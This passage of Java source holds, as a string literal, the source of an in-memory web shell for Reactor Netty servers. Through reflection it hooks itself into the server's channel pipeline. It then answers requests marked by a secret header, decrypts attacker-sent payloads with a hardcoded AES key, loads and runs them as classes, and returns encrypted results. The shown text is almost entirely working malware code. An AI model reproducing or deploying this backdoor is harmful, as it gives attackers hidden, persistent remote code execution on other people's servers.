            "                    Field _val$disposableServer = thread.getClass().getDeclaredField(\"val$disposableServer\");\n" +
            "                    _val$disposableServer.setAccessible(true);\n" +
            "                    Object val$disposableServer = _val$disposableServer.get(thread);\n" +
            "                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField(\"config\");\n" +
            "                    _config.setAccessible(true);\n" +
            "                    Object config = _config.get(val$disposableServer);\n" +
            "                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField(\"doOnChannelInit\");\n" +
            "                    _doOnChannelInit.setAccessible(true);\n" +
            "                    _doOnChannelInit.set(config, new NettyHandlerMemShell());\n" +
            "\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    String xc = \"3c6e0b8a9c15224a\";\n" +
            "    String pass = \"pAS3\";\n" +
            "    String md5 = md5(pass + xc);\n" +
            "\n" +
            "    private static Class defClass(byte[] classbytes) throws Exception {\n" +
            "        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());\n" +
            "        Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "        method.setAccessible(true);\n" +
            "        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception e) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "        try {\n" +
            "            java.security.MessageDigest m;\n" +
            "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public byte[] base64Encode(byte[] bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        byte[] value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", new Class[]{null}).invoke(base64, new Object[]{null});\n" +
            "            value = (byte[]) Encoder.getClass().getMethod(\"encode\", new Class[]{\n" +
            "                    byte[].class\n" +
            "            }).invoke(Encoder, new Object[]{\n" +
            "                    bs\n" +
            "            });\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = ((String) Encoder.getClass().getMethod(\"encode\", new Class[]{\n" +
            "                        byte[].class\n" +
            "                }).invoke(Encoder, new Object[]{\n" +
            "                        bs\n" +
            "                })).getBytes();\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        byte[] value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", new Class[]{null}).invoke(base64, new Object[]{null});\n" +
            "            value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{\n" +
            "                    String.class\n" +
            "            }).invoke(decoder, new Object[]{\n" +
            "                    bs\n" +
            "            });\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{\n" +
            "                        String.class\n" +
            "                }).invoke(decoder, new Object[]{\n" +
            "                        bs\n" +
            "                });\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    private static byte[] byteMergerAll(byte[]... values) {\n" +
            "        int length_byte = 0;\n" +
            "        for (int i = 0; i < values.length; i++) {\n" +
            "            length_byte += values[i].length;\n" +
            "        }\n" +
            "        byte[] all_byte = new byte[length_byte];\n" +
            "        int countLength = 0;\n" +
            "        for (int i = 0; i < values.length; i++) {\n" +
            "            byte[] b = values[i];\n" +
            "            System.arraycopy(b, 0, all_byte, countLength, b.length);\n" +
            "            countLength += b.length;\n" +
            "        }\n" +
            "        return all_byte;\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {\n" +
            "        ChannelPipeline pipeline = channel.pipeline();\n" +
            "        pipeline.addBefore(\"reactor.left.httpTrafficHandler\", \"xxxhandler\", new NettyHandlerMemShell());\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static ThreadLocal<AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream>> requestThreadLocal = new ThreadLocal<AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream>>();\n" +
            "    private static Class payload;\n" +
            "\n" +
            "    @Override\n" +
            "    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n" +
            "\n" +
            "        if (msg instanceof HttpRequest) {\n" +
            "            HttpRequest httpRequest = (HttpRequest) msg;\n" +
            "            if (!httpRequest.headers().contains(\"tyr\")) {\n" +
            "                ctx.fireChannelRead(msg);\n" +
            "                return;\n" +
            "            }\n" +
            "            AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream> simpleEntry = new AbstractMap.SimpleEntry(httpRequest, new ByteArrayOutputStream());\n" +
            "            requestThreadLocal.set(simpleEntry);\n" +
            "        } else if (msg instanceof HttpContent) {\n" +
            "            HttpContent httpContent = (HttpContent) msg;\n" +
            "            AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream> simpleEntry = requestThreadLocal.get();\n" +
            "            if (simpleEntry == null) {\n" +
            "                return;\n" +
            "            }\n" +
            "            HttpRequest httpRequest = simpleEntry.getKey();\n" +
            "            HttpHeaders headers = httpRequest.headers();\n" +
            "            if (headers.contains(\"X-Requested-With\", \"XMLHTTPRequest\", false)) {\n" +
            "                ByteArrayOutputStream contentBuf = simpleEntry.getValue();\n" +
            "                ByteBuf byteBuf = httpContent.content();\n" +
            "                int size = byteBuf.capacity();\n" +
            "                byte[] requestContent = new byte[size];\n" +
            "                byteBuf.getBytes(0, requestContent, 0, requestContent.length);\n" +
            "                contentBuf.write(requestContent);\n" +
            "                if (httpContent instanceof LastHttpContent) {\n" +
            "                    try {\n" +
            "                        String payloadString = URLDecoder.decode(new String(contentBuf.toByteArray()));\n" +
            "                        int index = payloadString.indexOf(\"=\");\n" +
            "                        payloadString = payloadString.substring(index + 1);\n" +
            "                        byte[] data = x(base64Decode(payloadString), false);\n" +
            "                        if (payload == null) {\n" +
            "                            payload = defClass(data);\n" +
            "                        } else {\n" +
            "                            Object f = payload.newInstance();\n" +
            "                            ByteArrayOutputStream arrOut = new ByteArrayOutputStream();\n" +
            "                            f.equals(arrOut);\n" +
            "                            f.equals(data);\n" +
            "                            f.toString();\n" +
            "                            String md51 = md5.substring(0, 16);\n" +
            "                            String md52 = md5.substring(16, 32);\n" +
            "                            byte[] resp = byteMergerAll(md51.getBytes(), base64Encode(x(arrOut.toByteArray(), true)), md52.getBytes());\n" +
            "                            send(ctx, resp, HttpResponseStatus.OK);\n" +
            "                        }\n" +
            "                    } catch (Exception e) {\n" +
            "                        ctx.fireChannelRead(httpRequest);\n" +
            "                    }\n" +
            "                } else if (headers.contains(\"X-Requested-With\", \"xmlHTTPRequest\", false)) {\n" +
            "                    send(ctx, \"Success\".getBytes(), HttpResponseStatus.OK);\n" +
            "                }\n" +
            "            } else {\n" +
            "                ctx.fireChannelRead(msg);\n" +
            "            }\n" +
            "\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private void send(ChannelHandlerContext ctx, byte[] context, HttpResponseStatus status) {\n" +
            "        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));\n" +
            "        response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain; charset=UTF-8\");\n" +
            "        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n" +
            "    }\n" +
            "}";
}
